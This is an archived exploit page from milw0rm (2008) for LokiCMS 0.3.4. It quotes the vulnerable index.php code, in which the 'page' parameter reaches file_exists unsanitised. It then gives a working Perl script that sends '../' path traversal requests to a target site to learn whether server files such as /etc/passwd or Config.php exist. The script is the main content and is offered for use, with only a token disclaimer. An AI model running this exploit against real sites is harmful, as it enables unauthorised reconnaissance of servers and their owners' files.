<html><head><title>LokiCMS <= 0.3.4 (index.php page) Arbitrary Check  File Exploit</title></head><pre># LokiCMS &lt;= 0.3.4 (index.php page) Arbitrary Check File Exploit
# url: http://www.lokicms.com/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Greetz To: All Hackers and milw0rm website

vulnerability:
The vulnerability allows to verify the existence of the files and directories around the server.
/etc/passwd (example)

vuln file: index.php
vuln code:
------------------------------------------------
if ( isset ( $_GET ) &amp;&amp; isset ( $_GET['page'] ) ) $pagename = stripslashes ( trim ( $_GET['page'] ) );



// load the page

if ($pagename == '') {

	$name = $c_default;

	$nosimple = true;

} else {

	$name = $pagename;

};



if ($c_simplelink == true &amp;&amp; $nosimple != true) {

	$content = findpage($name);

	if ($content == &quot;&quot;) {$content = $c_default;};

} else {

	$content = $name;

};



// stupid fix due to subdomain problems

if ($c_modrewrite != true &amp;&amp; $pagename != '') {if (file_exists(PATH . &quot;/pages/&quot; . $content) == false) {$content = $c_default;};};



// load the menu

$menu = getmenu($content, $c_modrewrite, $c_simplelink);



$content = parsepage($content);
------------------------------------------------

use strict;
use LWP::UserAgent;

sub lw
{

my $SO = $^O;
my $linux = &quot;&quot;;
if (index(lc($SO),&quot;win&quot;)!=-1){
		   $linux=&quot;0&quot;;
	    }else{
		    $linux=&quot;1&quot;;
	    }
		if($linux){
system(&quot;clear&quot;);
}
else{
system(&quot;cls&quot;);
}

}

&amp;lw;

print &quot;#################################################################\n&quot;;
print &quot;#  LokiCMS 0.3.4 (index.php page) Arbitrary Check File Exploit  #\n&quot;;
print &quot;#################################################################\n&quot;;

my $victim = $ARGV[0];
my $file = $ARGV[1];

 if((!$ARGV[0]) &amp;&amp; (!$ARGV[1])) {
    print &quot;\n[x] LokiCMS 0.3.4 (index.php page) Arbitrary Check File Exploit\n&quot;;
    print &quot;[x] written by JosS - sys-project[at]hotmail.com\n&quot;;
    print &quot;[x] usage: perl xpl.pl [host] [file]\n&quot;;
    print &quot;[x] example: http://localhost/loki/ /includes/Config.php\n\n&quot;;
    exit(1);
 }
 
    print &quot;\n[+] connecting: $victim\n&quot;;
    my $cnx = LWP::UserAgent-&gt;new() or die;
    my $go=$cnx-&gt;get($victim.&quot;index.php?page=../$file&quot;);
    if ($go-&gt;content =~ m/LokiCMS/ms) {
        print &quot;[-] The file not exist\n\n&quot;;
    } else {
        print &quot;[!] The file exist: $file\n\n&quot;;
    }

# live demo: http://demo.opensourcecms.com/lokicms/

# milw0rm.com [2008-10-12]</pre></html>